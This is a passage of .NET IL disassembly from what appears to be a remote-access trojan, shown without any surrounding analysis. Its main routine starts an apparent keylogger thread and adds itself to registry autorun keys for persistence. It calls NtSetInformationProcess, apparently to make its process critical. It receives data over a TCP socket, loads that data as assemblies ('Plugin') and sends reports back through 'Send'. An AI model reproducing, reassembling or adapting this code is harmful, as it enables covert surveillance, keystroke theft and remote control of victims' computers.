      IL_00c0:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00c5:  stloc.3
      IL_00c6:  ldloc.3
      IL_00c7:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00cc:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00d1:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00d6:  leave.s    IL_00d8

    }  // end handler
    IL_00d8:  ldc.i4     0x1388
    IL_00dd:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
    IL_00e2:  ldc.i4.0
    IL_00e3:  stloc.0
    IL_00e4:  ldc.i4.1
    IL_00e5:  ldsfld     string j.OK::RG
    IL_00ea:  ldloca.s   V_0
    IL_00ec:  newobj     instance void [mscorlib]System.Threading.Mutex::.ctor(bool,
                                                                               string,
                                                                               bool&)
    IL_00f1:  stsfld     object j.OK::MT
    IL_00f6:  ldloc.0
    IL_00f7:  brtrue.s   IL_00fe

    IL_00f9:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_00fe:  call       void j.OK::INS()
    IL_0103:  ldsfld     bool j.OK::Idr
    IL_0108:  brtrue.s   IL_012d

    IL_010a:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
    IL_010f:  callvirt   instance string [mscorlib]System.IO.FileInfo::get_Name()
    IL_0114:  stsfld     string j.OK::EXE
    IL_0119:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
    IL_011e:  callvirt   instance class [mscorlib]System.IO.DirectoryInfo [mscorlib]System.IO.FileInfo::get_Directory()
    IL_0123:  callvirt   instance string [mscorlib]System.IO.DirectoryInfo::get_Name()
    IL_0128:  stsfld     string j.OK::DR
    IL_012d:  ldnull
    IL_012e:  ldftn      void j.OK::RC()
    IL_0134:  newobj     instance void [mscorlib]System.Threading.ThreadStart::.ctor(object,
                                                                                     native int)
    IL_0139:  ldc.i4.1
    IL_013a:  newobj     instance void [mscorlib]System.Threading.Thread::.ctor(class [mscorlib]System.Threading.ThreadStart,
                                                                                int32)
    IL_013f:  callvirt   instance void [mscorlib]System.Threading.Thread::Start()
    .try
    {
      IL_0144:  ldsfld     bool j.OK::DisKey
      IL_0149:  brtrue.s   IL_0170

      IL_014b:  newobj     instance void j.kl::.ctor()
      IL_0150:  stsfld     class j.kl j.OK::kq
      IL_0155:  ldsfld     class j.kl j.OK::kq
      IL_015a:  ldftn      instance void j.kl::WRK()
      IL_0160:  newobj     instance void [mscorlib]System.Threading.ThreadStart::.ctor(object,
                                                                                       native int)
      IL_0165:  ldc.i4.1
      IL_0166:  newobj     instance void [mscorlib]System.Threading.Thread::.ctor(class [mscorlib]System.Threading.ThreadStart,
                                                                                  int32)
      IL_016b:  callvirt   instance void [mscorlib]System.Threading.Thread::Start()
      IL_0170:  leave.s    IL_018d

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0172:  dup
      IL_0173:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0178:  stloc.s    V_4
      IL_017a:  ldloc.s    V_4
      IL_017c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0181:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0186:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_018b:  leave.s    IL_018d

    }  // end handler
    IL_018d:  ldc.i4.0
    IL_018e:  stloc.1
    IL_018f:  ldstr      ""
    IL_0194:  stloc.2
    IL_0195:  ldsfld     bool j.OK::BD
    IL_019a:  brfalse.s  IL_01d0

    .try
    {
      IL_019c:  ldnull
      IL_019d:  ldftn      void j.OK::_Lambda__2(object,
                                                 class [System]Microsoft.Win32.SessionEndingEventArgs)
      IL_01a3:  newobj     instance void [System]Microsoft.Win32.SessionEndingEventHandler::.ctor(object,
                                                                                                  native int)
      IL_01a8:  call       void [System]Microsoft.Win32.SystemEvents::add_SessionEnding(class [System]Microsoft.Win32.SessionEndingEventHandler)
      IL_01ad:  ldc.i4.1
      IL_01ae:  call       void j.OK::pr(int32)
      IL_01b3:  leave.s    IL_01d0

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_01b5:  dup
      IL_01b6:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_01bb:  stloc.s    V_5
      IL_01bd:  ldloc.s    V_5
      IL_01bf:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_01c4:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_01c9:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_01ce:  leave.s    IL_01d0

    }  // end handler
    IL_01d0:  ldc.i4     0x3e8
    IL_01d5:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
    IL_01da:  ldsfld     bool j.OK::Cn
    IL_01df:  brtrue.s   IL_01e7

    IL_01e1:  ldstr      ""
    IL_01e6:  stloc.2
    IL_01e7:  call       void [System.Windows.Forms]System.Windows.Forms.Application::DoEvents()
    .try
    {
      IL_01ec:  ldloc.1
      IL_01ed:  ldc.i4.1
      IL_01ee:  add.ovf
      IL_01ef:  stloc.1
      IL_01f0:  ldloc.1
      IL_01f1:  ldc.i4.5
      IL_01f2:  bne.un.s   IL_0225

      .try
      {
        IL_01f4:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::GetCurrentProcess()
        IL_01f9:  ldc.i4     0x400
        IL_01fe:  call       native int [mscorlib]System.IntPtr::op_Explicit(int32)
        IL_0203:  callvirt   instance void [System]System.Diagnostics.Process::set_MinWorkingSet(native int)
        IL_0208:  leave.s    IL_0225

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_020a:  dup
        IL_020b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0210:  stloc.s    V_6
        IL_0212:  ldloc.s    V_6
        IL_0214:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0219:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_021e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0223:  leave.s    IL_0225

      }  // end handler
      IL_0225:  ldloc.1
      IL_0226:  ldc.i4.8
      IL_0227:  blt.s      IL_0257

      IL_0229:  ldc.i4.0
      IL_022a:  stloc.1
      IL_022b:  call       string j.OK::ACT()
      IL_0230:  stloc.s    V_7
      IL_0232:  ldloc.2
      IL_0233:  ldloc.s    V_7
      IL_0235:  ldc.i4.0
      IL_0236:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_023b:  brfalse.s  IL_0257

      IL_023d:  ldloc.s    V_7
      IL_023f:  stloc.2
      IL_0240:  ldstr      "act"
      IL_0245:  ldsfld     string j.OK::Y
      IL_024a:  ldloc.s    V_7
      IL_024c:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0251:  call       bool j.OK::Send(string)
      IL_0256:  pop
      IL_0257:  ldsfld     bool j.OK::Isu
      IL_025c:  brfalse    IL_03bc

      .try
      {
        IL_0261:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
        IL_0266:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
        IL_026b:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
        IL_0270:  ldsfld     string j.OK::sf
        IL_0275:  ldstr      "\\"
        IL_027a:  ldsfld     string j.OK::RG
        IL_027f:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_0284:  ldstr      ""
        IL_0289:  callvirt   instance object [mscorlib]Microsoft.Win32.RegistryKey::GetValue(string,
                                                                                             object)
        IL_028e:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
        IL_0293:  ldstr      "\""
        IL_0298:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
        IL_029d:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
        IL_02a2:  ldstr      "\" .."
        IL_02a7:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_02ac:  ldc.i4.0
        IL_02ad:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConditionalCompareObjectNotEqual(object,
                                                                                                                                            object,
                                                                                                                                            bool)
        IL_02b2:  brfalse.s  IL_02f1

        IL_02b4:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
        IL_02b9:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
        IL_02be:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
        IL_02c3:  ldsfld     string j.OK::sf
        IL_02c8:  ldc.i4.1
        IL_02c9:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                    bool)
        IL_02ce:  ldsfld     string j.OK::RG
        IL_02d3:  ldstr      "\""
        IL_02d8:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
        IL_02dd:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
        IL_02e2:  ldstr      "\" .."
        IL_02e7:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_02ec:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::SetValue(string,
                                                                                           object)
        IL_02f1:  leave.s    IL_030e

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_02f3:  dup
        IL_02f4:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_02f9:  stloc.s    V_8
        IL_02fb:  ldloc.s    V_8
        IL_02fd:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0302:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0307:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_030c:  leave.s    IL_030e

      }  // end handler
      IL_030e:  nop
      .try
      {
        IL_030f:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
        IL_0314:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
        IL_0319:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_LocalMachine()
        IL_031e:  ldsfld     string j.OK::sf
        IL_0323:  ldstr      "\\"
        IL_0328:  ldsfld     string j.OK::RG
        IL_032d:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_0332:  ldstr      ""
        IL_0337:  callvirt   instance object [mscorlib]Microsoft.Win32.RegistryKey::GetValue(string,
                                                                                             object)
        IL_033c:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
        IL_0341:  ldstr      "\""
        IL_0346:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
        IL_034b:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
        IL_0350:  ldstr      "\" .."
        IL_0355:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_035a:  ldc.i4.0
        IL_035b:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConditionalCompareObjectNotEqual(object,
                                                                                                                                            object,
                                                                                                                                            bool)
        IL_0360:  brfalse.s  IL_039f

        IL_0362:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
        IL_0367:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
        IL_036c:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_LocalMachine()
        IL_0371:  ldsfld     string j.OK::sf
        IL_0376:  ldc.i4.1
        IL_0377:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                    bool)
        IL_037c:  ldsfld     string j.OK::RG
        IL_0381:  ldstr      "\""
        IL_0386:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
        IL_038b:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
        IL_0390:  ldstr      "\" .."
        IL_0395:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_039a:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::SetValue(string,
                                                                                           object)
        IL_039f:  leave.s    IL_03bc

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_03a1:  dup
        IL_03a2:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_03a7:  stloc.s    V_9
        IL_03a9:  ldloc.s    V_9
        IL_03ab:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_03b0:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_03b5:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_03ba:  leave.s    IL_03bc

      }  // end handler
      IL_03bc:  leave      IL_01d0

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_03c1:  dup
      IL_03c2:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_03c7:  stloc.s    V_10
      IL_03c9:  ldloc.s    V_10
      IL_03cb:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_03d0:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_03d5:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_03da:  leave      IL_01d0
    }  // end handler
  } // end of method OK::ko

  .method public static string  md5(uint8[] B) cil managed
  {
    // Code size       60 (0x3c)
    .maxstack  3
    .locals init (string V_0,
             uint8 V_1,
             uint8[] V_2,
             int32 V_3)
    IL_0000:  newobj     instance void [mscorlib]System.Security.Cryptography.MD5CryptoServiceProvider::.ctor()
    IL_0005:  ldarg.0
    IL_0006:  call       instance uint8[] [mscorlib]System.Security.Cryptography.HashAlgorithm::ComputeHash(uint8[])
    IL_000b:  starg.s    B
    IL_000d:  ldstr      ""
    IL_0012:  stloc.0
    IL_0013:  ldarg.0
    IL_0014:  stloc.2
    IL_0015:  ldc.i4.0
    IL_0016:  stloc.3
    IL_0017:  br.s       IL_0034

    IL_0019:  ldloc.2
    IL_001a:  ldloc.3
    IL_001b:  ldelem.u1
    IL_001c:  stloc.1
    IL_001d:  ldloc.0
    IL_001e:  ldloca.s   V_1
    IL_0020:  ldstr      "x2"
    IL_0025:  call       instance string [mscorlib]System.Byte::ToString(string)
    IL_002a:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_002f:  stloc.0
    IL_0030:  ldloc.3
    IL_0031:  ldc.i4.1
    IL_0032:  add.ovf
    IL_0033:  stloc.3
    IL_0034:  ldloc.3
    IL_0035:  ldloc.2
    IL_0036:  ldlen
    IL_0037:  conv.i4
    IL_0038:  blt.s      IL_0019

    IL_003a:  ldloc.0
    IL_003b:  ret
  } // end of method OK::md5

  .method private static pinvokeimpl("ntdll" winapi) 
          int32  NtSetInformationProcess(native int hProcess,
                                         int32 processInformationClass,
                                         int32& processInformation,
                                         int32 processInformationLength) cil managed preservesig
  {
  }
  .method public static object  Plugin(uint8[] b,
                                       string c) cil managed
  {
    // Code size       114 (0x72)
    .maxstack  3
    .locals init (object V_0,
             class [mscorlib]System.Reflection.Module V_1,
             class [mscorlib]System.Reflection.Module[] V_2,
             int32 V_3,
             class [mscorlib]System.Type V_4,
             class [mscorlib]System.Type[] V_5,
             int32 V_6)
    IL_0000:  ldarg.0
    IL_0001:  call       class [mscorlib]System.Reflection.Assembly [mscorlib]System.Reflection.Assembly::Load(uint8[])
    IL_0006:  callvirt   instance class [mscorlib]System.Reflection.Module[] [mscorlib]System.Reflection.Assembly::GetModules()
    IL_000b:  stloc.2
    IL_000c:  ldc.i4.0
    IL_000d:  stloc.3
    IL_000e:  br.s       IL_0068

    IL_0010:  ldloc.2
    IL_0011:  ldloc.3
    IL_0012:  ldelem.ref
    IL_0013:  stloc.1
    IL_0014:  ldloc.1
    IL_0015:  callvirt   instance class [mscorlib]System.Type[] [mscorlib]System.Reflection.Module::GetTypes()
    IL_001a:  stloc.s    V_5
    IL_001c:  ldc.i4.0
    IL_001d:  stloc.s    V_6
    IL_001f:  br.s       IL_005c

    IL_0021:  ldloc.s    V_5
    IL_0023:  ldloc.s    V_6
    IL_0025:  ldelem.ref
    IL_0026:  stloc.s    V_4
    IL_0028:  ldloc.s    V_4
    IL_002a:  callvirt   instance string [mscorlib]System.Type::get_FullName()
    IL_002f:  ldstr      "."
    IL_0034:  ldarg.1
    IL_0035:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_003a:  callvirt   instance bool [mscorlib]System.String::EndsWith(string)
    IL_003f:  brfalse.s  IL_0056

    IL_0041:  ldloc.1
    IL_0042:  callvirt   instance class [mscorlib]System.Reflection.Assembly [mscorlib]System.Reflection.Module::get_Assembly()
    IL_0047:  ldloc.s    V_4
    IL_0049:  callvirt   instance string [mscorlib]System.Type::get_FullName()
    IL_004e:  callvirt   instance object [mscorlib]System.Reflection.Assembly::CreateInstance(string)
    IL_0053:  stloc.0
    IL_0054:  br.s       IL_0070

    IL_0056:  ldloc.s    V_6
    IL_0058:  ldc.i4.1
    IL_0059:  add.ovf
    IL_005a:  stloc.s    V_6
    IL_005c:  ldloc.s    V_6
    IL_005e:  ldloc.s    V_5
    IL_0060:  ldlen
    IL_0061:  conv.i4
    IL_0062:  blt.s      IL_0021

    IL_0064:  ldloc.3
    IL_0065:  ldc.i4.1
    IL_0066:  add.ovf
    IL_0067:  stloc.3
    IL_0068:  ldloc.3
    IL_0069:  ldloc.2
    IL_006a:  ldlen
    IL_006b:  conv.i4
    IL_006c:  blt.s      IL_0010

    IL_006e:  ldnull
    IL_006f:  stloc.0
    IL_0070:  ldloc.0
    IL_0071:  ret
  } // end of method OK::Plugin

  .method public static void  pr(int32 i) cil managed
  {
    // Code size       49 (0x31)
    .maxstack  4
    .locals init (class [mscorlib]System.Exception V_0)
    .try
    {
      IL_0000:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::GetCurrentProcess()
      IL_0005:  callvirt   instance native int [System]System.Diagnostics.Process::get_Handle()
      IL_000a:  ldc.i4.s   29
      IL_000c:  ldarga.s   i
      IL_000e:  ldc.i4.4
      IL_000f:  call       int32 j.OK::NtSetInformationProcess(native int,
                                                               int32,
                                                               int32&,
                                                               int32)
      IL_0014:  pop
      IL_0015:  leave.s    IL_0030

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0017:  dup
      IL_0018:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_001d:  stloc.0
      IL_001e:  ldloc.0
      IL_001f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0024:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0029:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_002e:  leave.s    IL_0030

    }  // end handler
    IL_0030:  ret
  } // end of method OK::pr

  .method public static void  RC() cil managed
  {
    // Code size       565 (0x235)
    .maxstack  8
    .locals init (int64 V_0,
             int32 V_1,
             int64 V_2,
             int32 V_3,
             string V_4,
             int32 V_5,
             char V_6,
             class [mscorlib]System.Exception V_7,
             class [mscorlib]System.Exception V_8)
    IL_0000:  ldstr      ""
    IL_0005:  stsfld     string j.OK::lastcap
    IL_000a:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
    IL_000f:  brfalse    IL_01d2

    IL_0014:  ldc.i4.m1
    IL_0015:  conv.i8
    IL_0016:  stloc.0
    IL_0017:  ldc.i4.0
    IL_0018:  stloc.1
    .try
    {
      IL_0019:  ldloc.1
      IL_001a:  ldc.i4.1
      IL_001b:  add.ovf
      IL_001c:  stloc.1
      IL_001d:  ldloc.1
      IL_001e:  ldc.i4.s   10
      IL_0020:  bne.un.s   IL_002a

      IL_0022:  ldc.i4.0
      IL_0023:  stloc.1
      IL_0024:  ldc.i4.1
      IL_0025:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
      IL_002a:  ldsfld     bool j.OK::Cn
      IL_002f:  brtrue.s   IL_0036

      IL_0031:  leave      IL_01d2

      IL_0036:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
      IL_003b:  callvirt   instance int32 [System]System.Net.Sockets.TcpClient::get_Available()
      IL_0040:  ldc.i4.1
      IL_0041:  bge.s      IL_0055

      IL_0043:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
      IL_0048:  callvirt   instance class [System]System.Net.Sockets.Socket [System]System.Net.Sockets.TcpClient::get_Client()
      IL_004d:  ldc.i4.m1
      IL_004e:  ldc.i4.0
      IL_004f:  callvirt   instance bool [System]System.Net.Sockets.Socket::Poll(int32,
                                                                                 valuetype [System]System.Net.Sockets.SelectMode)
      IL_0054:  pop
      IL_0055:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
      IL_005a:  callvirt   instance int32 [System]System.Net.Sockets.TcpClient::get_Available()
      IL_005f:  ldc.i4.0
      IL_0060:  ble        IL_01b5

      IL_0065:  ldloc.0
      IL_0066:  ldc.i4.m1
      IL_0067:  conv.i8
      IL_0068:  bne.un.s   IL_00e9

      IL_006a:  ldstr      ""
      IL_006f:  stloc.s    V_4
      IL_0071:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
      IL_0076:  callvirt   instance class [System]System.Net.Sockets.NetworkStream [System]System.Net.Sockets.TcpClient::GetStream()
      IL_007b:  callvirt   instance int32 [mscorlib]System.IO.Stream::ReadByte()
      IL_0080:  stloc.s    V_5
      IL_0082:  ldloc.s    V_5
      IL_0084:  ldc.i4.m1
      IL_0085:  beq.s      IL_008d

      IL_0087:  ldloc.s    V_5
      IL_0089:  brfalse.s  IL_0092

      IL_008b:  br.s       IL_00c4

      IL_008d:  leave      IL_01d2

      IL_0092:  ldloc.s    V_4
      IL_0094:  call       int64 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToLong(string)
      IL_0099:  stloc.0
      IL_009a:  ldstr      ""
      IL_009f:  stloc.s    V_4
      IL_00a1:  ldloc.0
      IL_00a2:  brtrue.s   IL_00b2

      IL_00a4:  ldstr      ""
      IL_00a9:  call       bool j.OK::Send(string)
      IL_00ae:  pop
      IL_00af:  ldc.i4.m1
      IL_00b0:  conv.i8
      IL_00b1:  stloc.0
      IL_00b2:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
      IL_00b7:  callvirt   instance int32 [System]System.Net.Sockets.TcpClient::get_Available()
      IL_00bc:  ldc.i4.0
      IL_00bd:  bgt.s      IL_0055

      IL_00bf:  br         IL_0019

      IL_00c4:  ldloc.s    V_4
      IL_00c6:  ldloc.s    V_5
      IL_00c8:  call       char [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::ChrW(int32)
      IL_00cd:  stloc.s    V_6
      IL_00cf:  ldloca.s   V_6
      IL_00d1:  call       instance string [mscorlib]System.Char::ToString()
      IL_00d6:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
      IL_00db:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(int32)
      IL_00e0:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_00e5:  stloc.s    V_4
      IL_00e7:  br.s       IL_0071

      IL_00e9:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
      IL_00ee:  callvirt   instance int32 [System]System.Net.Sockets.TcpClient::get_Available()
      IL_00f3:  ldc.i4.1
      IL_00f4:  add.ovf
      IL_00f5:  ldc.i4.1
      IL_00f6:  sub.ovf
      IL_00f7:  ldc.i4.1
      IL_00f8:  add.ovf
      IL_00f9:  newarr     [mscorlib]System.Byte
      IL_00fe:  stsfld     uint8[] j.OK::b
      IL_0103:  ldloc.0
      IL_0104:  ldsfld     class [mscorlib]System.IO.MemoryStream j.OK::MeM
      IL_0109:  callvirt   instance int64 [mscorlib]System.IO.MemoryStream::get_Length()
      IL_010e:  sub.ovf
      IL_010f:  stloc.2
      IL_0110:  ldsfld     uint8[] j.OK::b
      IL_0115:  ldlen
      IL_0116:  conv.i4
      IL_0117:  conv.i8
      IL_0118:  ldloc.2
      IL_0119:  ble.s      IL_0130

      IL_011b:  ldloc.2
      IL_011c:  ldc.i4.1
      IL_011d:  conv.i8
      IL_011e:  sub.ovf
      IL_011f:  conv.ovf.i4
      IL_0120:  ldc.i4.1
      IL_0121:  add.ovf
      IL_0122:  ldc.i4.1
      IL_0123:  sub.ovf
      IL_0124:  ldc.i4.1
      IL_0125:  add.ovf
      IL_0126:  newarr     [mscorlib]System.Byte
      IL_012b:  stsfld     uint8[] j.OK::b
      IL_0130:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
      IL_0135:  callvirt   instance class [System]System.Net.Sockets.Socket [System]System.Net.Sockets.TcpClient::get_Client()
      IL_013a:  ldsfld     uint8[] j.OK::b
      IL_013f:  ldc.i4.0
      IL_0140:  ldsfld     uint8[] j.OK::b
      IL_0145:  ldlen
      IL_0146:  conv.i4
      IL_0147:  ldc.i4.0
      IL_0148:  callvirt   instance int32 [System]System.Net.Sockets.Socket::Receive(uint8[],
                                                                                     int32,
                                                                                     int32,
                                                                                     valuetype [System]System.Net.Sockets.SocketFlags)
      IL_014d:  stloc.3
      IL_014e:  ldsfld     class [mscorlib]System.IO.MemoryStream j.OK::MeM
      IL_0153:  ldsfld     uint8[] j.OK::b
      IL_0158:  ldc.i4.0
      IL_0159:  ldloc.3
      IL_015a:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                 int32,
                                                                                 int32)
      IL_015f:  ldsfld     class [mscorlib]System.IO.MemoryStream j.OK::MeM
      IL_0164:  callvirt   instance int64 [mscorlib]System.IO.MemoryStream::get_Length()
      IL_0169:  ldloc.0
      IL_016a:  bne.un     IL_0019

      IL_016f:  ldc.i4.m1
      IL_0170:  conv.i8
      IL_0171:  stloc.0
      IL_0172:  ldnull
      IL_0173:  ldftn      void j.OK::_Lambda__1(object)
      IL_0179:  newobj     instance void [mscorlib]System.Threading.ParameterizedThreadStart::.ctor(object,
                                                                                                    native int)
      IL_017e:  ldc.i4.1
      IL_017f:  newobj     instance void [mscorlib]System.Threading.Thread::.ctor(class [mscorlib]System.Threading.ParameterizedThreadStart,
                                                                                  int32)
      IL_0184:  dup
      IL_0185:  ldsfld     class [mscorlib]System.IO.MemoryStream j.OK::MeM
      IL_018a:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
      IL_018f:  callvirt   instance void [mscorlib]System.Threading.Thread::Start(object)
      IL_0194:  ldc.i4.s   100
      IL_0196:  callvirt   instance bool [mscorlib]System.Threading.Thread::Join(int32)
      IL_019b:  pop
      IL_019c:  ldsfld     class [mscorlib]System.IO.MemoryStream j.OK::MeM
      IL_01a1:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
